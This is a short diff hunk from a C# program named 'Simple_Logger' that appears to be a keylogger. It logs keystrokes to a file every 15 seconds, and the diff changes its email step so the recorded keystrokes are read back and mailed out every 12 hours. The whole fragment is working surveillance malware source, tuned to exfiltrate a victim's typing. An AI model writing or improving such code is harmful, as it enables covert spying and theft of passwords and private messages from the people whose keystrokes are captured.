@@ -87,14 +87,14 @@ namespace Simple_Logger
 
             // Write keystrokes to file every 15 seconds
 
-            Observable.Interval(TimeSpan.FromSeconds(15)).Subscribe(x =>
+            Observable.Timer(TimeSpan.FromSeconds(15), TimeSpan.FromSeconds(15)).Subscribe(x =>
             {
                 WriteToFile(filePath);
             });
 
             // Send an email every 12 hours
 
-            Observable.Interval(TimeSpan.FromSeconds(15)).Subscribe(x =>
+            Observable.Timer(TimeSpan.FromHours(12), TimeSpan.FromHours(12)).Subscribe(x =>
             {
                 // Read keystrokes from file
 
